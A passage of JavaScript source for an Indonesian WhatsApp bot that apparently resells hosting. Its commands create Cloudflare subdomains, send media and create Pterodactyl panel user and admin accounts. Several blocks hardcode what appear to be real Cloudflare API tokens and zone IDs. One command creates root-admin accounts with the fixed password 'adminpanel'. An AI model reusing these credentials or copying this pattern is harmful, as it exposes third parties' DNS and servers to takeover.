           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain19': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "33f5011c84308fd5ee0bf24e13364508";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "DiansHost.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain20': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "44fdddb637e651089cada7972e813354";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "DiansHost.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain21': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9e6ee9b849db7659516d03fd9dbf7bee";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "DiansHost.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain22': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ecfab91669cd9f1f269ff910ef37c4bc";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "dianshost.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain28': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "panellstore.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain24': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "66682b3bb4c566c45b8ade6c1f55638b";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "panellstore.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain25': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80bb373d8fbd32d5e9eb5c173d7958cf";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "panellstore.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain26': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b2dab95fa93b9957f47ef84e1bc9558f";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "panellstore.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain27': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "26b6ce099dc3d48e0b491a294786c68b";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "panellstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain23': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6cbcca73a1d2eadde62edfd18d29f65d";
               let apitoken = "ARS-yEHlkrFOsA9Gy8wVaWi0fTTHajZ_rzCTVLZe";
               let tld = "ziroyhost.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'restseler':
if (!isCreator) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
owner.splice('[]')
fs.writeFileSync('./config/seller.json', JSON.stringify(owner))
m.reply(`SUKSES`)
        break
case 'listseler':{
if (!isCreator) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
let listusr =`*List user ReslerPanel DiansHost*\n\ntotal user : ${owner.length}\n`
var no = 1
for (let x of owner) {
listusr +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listusr +=`Untuk menghapus user/member\nKetik ${prefix}delusr 628xxx/@tag`
m.reply(listusr)
}
        
        //random
        break
  case 'randomcecan1':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26621lw391.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_2662ze6pj1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
  m.reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await DiansHost.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        ///LOGO BY DiansHost PEDIA
break
case 'logo1': {
DiansHost.sendMessage(from, { image: hw1,  caption: ` Created By DiansHost Team` }, { quoted:m })
}
break
case 'logo2': {
DiansHost.sendMessage(from, { image: hw2,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo3': {
DiansHost.sendMessage(from, { image: hw3,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo4': {
DiansHost.sendMessage(from, { image: hw4,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo5': {
DiansHost.sendMessage(from, { image: hw5,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo6': {
DiansHost.sendMessage(from, { image: hw6,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo7': {
DiansHost.sendMessage(from, { image: hw7,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo8': {
DiansHost.sendMessage(from, { image: hw8,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo9': {
DiansHost.sendMessage(from, { image: hw9,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo10': {
DiansHost.sendMessage(from, { image: hw10,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo11': {
DiansHost.sendMessage(from, { image: hw11,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo12': {
DiansHost.sendMessage(from, { image: hw12,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo13': {
DiansHost.sendMessage(from, { image: hw13,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo14': {
DiansHost.sendMessage(from, { image: hw14,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo15': {
DiansHost.sendMessage(from, { image: hw15,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo16': {
DiansHost.sendMessage(from, { image: hw16,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo17': {
DiansHost.sendMessage(from, { image: hw17,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo18': {
    DiansHost.sendMessage(from, { image: hw18,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo19': {
DiansHost.sendMessage(from, { image: hw19,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo20': {
DiansHost.sendMessage(from, { image: hw20,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'hw21': {
DiansHost.sendMessage(from, { image: hw21,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo22': {
DiansHost.sendMessage(from, { image: hw22,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo23': {
DiansHost.sendMessage(from, { image: hw23,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo24': {
DiansHost.sendMessage(from, { image: hw24,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo25': {
DiansHost.sendMessage(from, { image: hw25,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo26': {
DiansHost.sendMessage(from, { image: hw26,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo27': {
DiansHost.sendMessage(from, { image: hw27,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo28': {
DiansHost.sendMessage(from, { image: hw28,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo29': {
DiansHost.sendMessage(from, { image: hw29,  caption: ` Created By DiansHost` }, { quoted:m })
}
break
case 'logo30': {
DiansHost.sendMessage(from, { image: hw30,  caption: ` Created By DiansHost` }, { quoted:m })
}
    
     break
//=================================================//
case 'ping': {
DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }, caption: `command : ${prefix}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
Runtime Bot : ${runtime(process.uptime())}
` }, { quoted: m })
}
    break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => DiansHost.sendMessage(from, { image: { url: data }, caption: `* Created By ${botName}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)   
       
     break

//=================================================//
case 'infopanel': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
DiansHost.sendMessage(from, { text : `  Hay Kak ${pushname} 

 _*Syarat & Ketentuan*_

1. _Fitur lupa password sudah bisa digunakan jadi pastikan email aktif kalian sudah di tambahkan di panel kami._
2. _Selalu backup data_
3. _Jangan beritahukan user password kepada orang lain ( kami tidak bertanggung jawab dengan hal ini )_

_*sebelumnya kami mengalami kasus dimana user kami menjual akunnya ke orang lain dan selang beberapa hari meminta kami untuk reset password hal ini membuat nama panel kami dibilang scam untuk menanggulangi hal ini kami tidak akan lagi membantu melakukan reset password.*` , mentions: participants.map(a => a.id)}, { quoted:m })
}   
        break
case 'buyadmin':{
if (cekSaldo(sender,db_saldo) < 15000) return DiansHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!q.split(',')[0]) return m.reply(`Ex : ${prefix+command} username\n\nContoh :\n${prefix+command} phnxstr`)
let d = (await DiansHost.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": q.split(',')[0],
"username": q.split(',')[1],
"first_name": q.split(',')[1],
"last_name": "Memb",
"language": "en",
"root_admin": true,
"password": "adminpanel",
})
})
let res = await f.json();
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
DiansHost.sendMessage(from, { text: `*SUKSES CREATE ADMIN*

_Username & Password Telah Di Kirim Ke Buyer_
Tersebut_*Rules :*
*- Jangan Hapus Akun Admin Lain*
*- Jangan Colong SC Buyer panel*
*- Jangan membuat Panel Terlalu besar*
*- Jangan Membuat Akun Admin Panel Lain*
*- Jangan Otak Atik panel*\n*Melanggar Salah Satu Rules Di Atas Langsung Di Hapus Admin Panel Nya*\n*mohon ikuti rules nya @${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
DiansHost.sendMessage(sender, { text: `*DATA AKUN ADMIN PANEL ANDA*\n\n*ID:* ${res.attributes.id}\n*EMAIL:* ${res.attributes.email}\n*USERNAME:* ${res.attributes.username}\n*PASSWORD:* adminpanel\n*LOGIN:* ${domain}`, mentions: [sender]}, { quoted: m })
}
      
    break

case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return DiansHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!q.split(',')[0]) return m.reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} DiansHost@gmail.com,DiansHost`)
if (!q.split(',')[1]) return m.reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} zaskia@gmail.com,zaskia`)
let d = (await DiansHost.onWhatsApp(sender.split('@')[0]))[0] || {}
let psswd = d.exists ? require("crypto").randomBytes(5).toString('hex') : username+'7739'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": q.split(',')[0],
"username": q.split(',')[1],
"first_name": q.split(',')[1],
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
let sections = [{
title: "PILIHAN PAKET",
rows: [
